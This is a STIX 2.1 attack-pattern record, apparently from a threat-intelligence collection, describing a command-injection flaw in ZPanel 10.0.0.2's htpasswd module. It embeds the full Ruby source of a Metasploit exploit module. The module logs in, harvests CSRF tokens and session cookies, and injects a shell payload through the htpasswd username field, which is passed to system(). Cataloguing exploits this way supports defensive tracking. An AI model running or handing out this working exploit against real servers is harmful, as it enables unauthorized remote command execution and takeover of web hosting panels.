{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0249c8af-a8b0-40d0-a4d7-9a0a9bd79c57",
    "created": "2024-08-14T17:13:30.77137Z",
    "modified": "2024-08-14T17:13:30.771374Z",
    "name": "\"ZPanel 10.0.0.2 htpasswd Module Username Command Execution\"",
    "description": " This module exploits a vulnerability found in ZPanel's htpasswd module. When creating .htaccess using the htpasswd module, the username field can be used to inject system commands, which is passed on to a system() function for executing the system's htpasswd command.  Please note: In order to use this module, you must have a valid account to login to ZPanel.  An account part of any of the default groups should suffice, such as: Administrators, Resellers, or Users (Clients).  By default, there's already a 'zadmin' user, but the password is randomly generated.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/zpanel_username_exec.rb",
            "external_id": "zpanel_username_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bobsta63/zpanelx/commit/fe9cec7a8164801e2b3755b7abeabdd607f97906"
        },
        {
            "source_name": "reference",
            "url": "http://forums.zpanelcp.com/showthread.php?27898-Serious-Remote-Execution-Exploit-in-Zpanel-10-0-0-2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ZPanel 10.0.0.2 htpasswd Module Username Command Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in ZPanel's htpasswd module. When\n        creating .htaccess using the htpasswd module, the username field can be used to\n        inject system commands, which is passed on to a system() function for executing\n        the system's htpasswd command.\n\n        Please note: In order to use this module, you must have a valid account to login\n        to ZPanel.  An account part of any of the default groups should suffice, such as:\n        Administrators, Resellers, or Users (Clients).  By default, there's already a\n        'zadmin' user, but the password is randomly generated.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'shachibista',  # Original discovery\n          'sinn3r'        # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '94038'],\n          ['URL', 'https://github.com/bobsta63/zpanelx/commit/fe9cec7a8164801e2b3755b7abeabdd607f97906'],\n          ['URL', 'http://forums.zpanelcp.com/showthread.php?27898-Serious-Remote-Execution-Exploit-in-Zpanel-10-0-0-2']\n        ],\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Targets'        =>\n        [\n          [ 'ZPanel 10.0.0.2 on Linux', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-06-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to ZPanel', '/']),\n        OptString.new('USERNAME', [true, 'The username to authenticate as']),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with'])\n      ])\n  end\n\n  def check\n    res = send_request_raw({'uri' => normalize_uri(target_uri.path)})\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body =~ /This server is running: ZPanel/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def login(base, token, cookie)\n    res  = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(base, 'index.php'),\n      'cookie'    => cookie,\n      'vars_post' => {\n        'inUsername' => datastore['USERNAME'],\n        'inPassword' => datastore['PASSWORD'],\n        'sublogin2'  => 'LogIn',\n        'csfr_token' => token\n      }\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Connection timed out\")\n    elsif res.body =~ /Application Error/ or res.headers['location'].to_s =~ /invalidlogin/\n      fail_with(Failure::NoAccess, \"#{peer} - Login failed\")\n    end\n\n    res.get_cookies.scan(/(zUserSaltCookie=[a-z0-9]+)/).flatten[0] || ''\n  end\n\n\n  def get_csfr_info(base, path='index.php', cookie='', vars={})\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(base),\n      'cookie'   => cookie,\n      'vars_get' => vars\n    })\n\n    fail_with(Failure::Unknown, \"#{peer} - Connection timed out while collecting CSFR token\") if not res\n\n    token = res.body.scan(/<input type=\"hidden\" name=\"csfr_token\" value=\"(.+)\">/).flatten[0] || ''\n    sid   = res.get_cookies.scan(/(PHPSESSID=[a-z0-9]+)/).flatten[0] || ''\n    fail_with(Failure::Unknown, \"#{peer} - No CSFR token collected\") if token.empty?\n\n    return token, sid\n  end\n\n\n  def exec(base, token, sid, user_salt_cookie)\n    fake_pass = Rex::Text.rand_text_alpha(5)\n    cookie    = \"#{sid}; #{user_salt_cookie}\"\n\n    send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(base),\n      'cookie'   => cookie,\n      'vars_get' => {\n        'module' => 'htpasswd',\n        'action' => 'CreateHTA'\n      },\n      'vars_post' => {\n        'inAuthName'          => 'Restricted+Area',\n        'inHTUsername'        => \";#{payload.encoded} #\",\n        'inHTPassword'        => fake_pass,\n        'inConfirmHTPassword' => fake_pass,\n        'inPath'              => '/',\n        'csfr_token'          => token\n      }\n    })\n  end\n\n\n  def exploit\n    base = target_uri.path\n\n    token, sid = get_csfr_info(base)\n    vprint_status(\"Token=#{token}, SID=#{sid}\")\n\n    user_salt_cookie = login(base, token, sid)\n    print_good(\"Logged in as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'\")\n\n    vars = {'module'=>'htpasswd', 'selected'=>'Selected', 'path'=>'/'}\n    cookie = \"#{sid}; #{user_salt_cookie}\"\n    token = get_csfr_info(base, '', cookie, vars)[0]\n    vprint_status(\"Token=#{token}, SID=#{sid}\")\n\n\n    print_status(\"Executing payload...\")\n    exec(base, token, sid, user_salt_cookie)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-07",
    "x_mitre_platforms": [
        "unix'"
    ]
}